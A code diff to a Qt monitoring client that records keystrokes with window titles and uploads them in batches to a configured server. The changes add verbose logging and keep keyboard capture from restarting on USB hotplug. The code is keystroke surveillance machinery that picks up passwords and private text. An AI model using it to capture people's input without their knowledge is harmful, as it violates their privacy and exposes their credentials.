@@ -47,6 +47,7 @@
 #include <qdebug.h>
 #include <qglobal.h>
 #include <qjsonobject.h>
+#include <QByteArray>
 
 #define TIC_INTERVAL 30
 #define HISTORY_INTERVAL 120
@@ -54,6 +55,17 @@
 // #define USB_INTERVAL 60
 #define SCREEN_INTERVAL 10
 #define STORAGE_CHECK_INTERVAL 5
+
+namespace {
+
+bool monitorClientKeyLogVerbose()
+{
+    const QByteArray v = qgetenv("MONITORCLIENT_KEYLOG_DEBUG");
+    return !v.isEmpty() && v != QByteArrayLiteral("0") && v != QByteArrayLiteral("false")
+           && v != QByteArrayLiteral("no");
+}
+
+} // namespace
 
 MonitorClient::MonitorClient()
 {
@@ -88,7 +100,8 @@ MonitorClient::MonitorClient()
     // Initialize keyboard monitor
     keyboardMonitor = new KeyboardMonitor(this);
     connect(keyboardMonitor, &KeyboardMonitor::keyPressed, this, &MonitorClient::handleKeyPress);
-    connect(this, &MonitorClient::usbEvent, keyboardMonitor, &KeyboardMonitor::handleUsbEvent);
+    // Do not restart keyboard capture on every USB hotplug — that tears down /dev/input fds and loses keys.
+    // Keyboard devices are discovered at startup; restart the app after plugging a USB keyboard if needed.
     
     // Connect signals to their respective slots
     // connect(this, &MonitorClient::screen, this, &MonitorClient::getScreen);
@@ -98,7 +111,7 @@ MonitorClient::MonitorClient()
     // connect(this, &MonitorClient::usbLog, this, &MonitorClient::sendUSBLogs);
     
     if (!keyboardMonitor->startMonitoring()) {
-        qDebug() << "Failed to start keyboard monitoring";
+        qWarning() << "[KeyLog] startMonitoring failed — no keys will be captured until input access works";
     }
 
     // Initialize storage monitoring
@@ -301,6 +314,16 @@ void MonitorClient::handleKeyPress(QString timestamp, const QString &windowTitle
     entryObj["application"] = windowTitle;
     entryObj["key"] = keyText;
     keyLogs.append(entryObj);
+
+    if (monitorClientKeyLogVerbose()) {
+        qDebug() << "[KeyLog] queued" << keyLogs.size() << "pending app:" << windowTitle;
+    } else {
+        const int n = keyLogs.size();
+        if (n == 1)
+            qInfo() << "[KeyLog] buffer: first keystroke queued";
+        else if (n % 100 == 0)
+            qInfo() << "[KeyLog] buffer:" << n << "keystrokes pending upload";
+    }
 }
 
 int MonitorClient::getScreen()
@@ -983,6 +1006,8 @@ void MonitorClient::monitorTimerTick()
     }
 
     if (currentTime - m_lastEmitKeyLogTime >= keyInterval && keylogEnabled) {
+        if (monitorClientKeyLogVerbose())
+            qDebug() << "[KeyLog] timer: emit keyLog signal, pending" << keyLogs.size();
         emit keyLog();
         m_lastEmitKeyLogTime = currentTime;
     }
@@ -1035,17 +1060,22 @@ QString MonitorClient::getFieldNameForVisitTime(const QString& browserName) {
 int MonitorClient::sendKeyLogs()
 {
     if (keyLogs.isEmpty()) {
-        qDebug() << "No key logs to send";
+        if (monitorClientKeyLogVerbose())
+            qDebug() << "[KeyLog] sendKeyLogs: nothing to send";
         return 1;
     }
     QString serverIP = getServerIP();
     int serverPort = getServerPort();
-    if (serverIP.isEmpty() || serverPort <= 0)
+    if (serverIP.isEmpty() || serverPort <= 0) {
+        qWarning() << "[KeyLog] sendKeyLogs: invalid server IP/port in settings";
         return -3;
+    }
 
+    const int totalEvents = keyLogs.size();
     QList<QList<QJsonObject>> chunks = chunkData(keyLogs, 1000);
     keyLogs.clear();
-    qDebug() << "Sending" << chunks.size() << "key log chunk(s)";
+    qInfo() << "[KeyLog] upload" << totalEvents << "events in" << chunks.size() << "chunk(s) ->"
+            << serverIP << ":" << serverPort << "interval" << keyInterval << "s";
     continueSendKeyLogs(0, chunks);
     return 0;
 }
@@ -1134,6 +1164,8 @@ void MonitorClient::continueSendKeyLogs(int index, QList<QList<QJsonObject>> chu
     QString serverIP = getServerIP();
     int serverPort = getServerPort();
     if (index >= chunks.size()) {
+        if (!chunks.isEmpty())
+            qInfo() << "[KeyLog] upload batch finished" << chunks.size() << "chunk(s)";
         updateStatusDisplay();
         return;
     }
@@ -1141,13 +1173,17 @@ void MonitorClient::continueSendKeyLogs(int index, QList<QList<QJsonObject>> chu
     sendDataChunkAsync(serverIP, serverPort, QStringLiteral("KeyLog"), QStringLiteral("KeyLogs"), chunkJson,
         [this, index, chunks](int ret) mutable {
             if (ret == 1) {
+                qInfo() << "[KeyLog] chunk" << (index + 1) << "/" << chunks.size() << "HTTP OK,"
+                        << chunks[index].size() << "events";
                 lastKeySentTime = QDateTime::currentDateTime();
                 updateStatusDisplay();
                 QTimer::singleShot(100, this, [this, index, chunks]() {
                     continueSendKeyLogs(index + 1, chunks);
                 });
             } else {
-                qDebug() << "Key log chunk failed at" << index;
+                qWarning() << "[KeyLog] chunk" << (index + 1) << "/" << chunks.size()
+                           << "HTTP failed (non-200 or network error)," << chunks[index].size()
+                           << "events lost from this batch";
                 updateStatusDisplay();
             }
         });
@@ -1641,6 +1677,7 @@ void MonitorClient::enableScreenshot(bool enabled)
 void MonitorClient::enableKeylog(bool enabled)
 {
     keylogEnabled = enabled;
+    qInfo() << "[KeyLog] uploads" << (enabled ? "enabled" : "disabled") << "interval" << keyInterval << "s";
     updateStatusDisplay();
 }
 
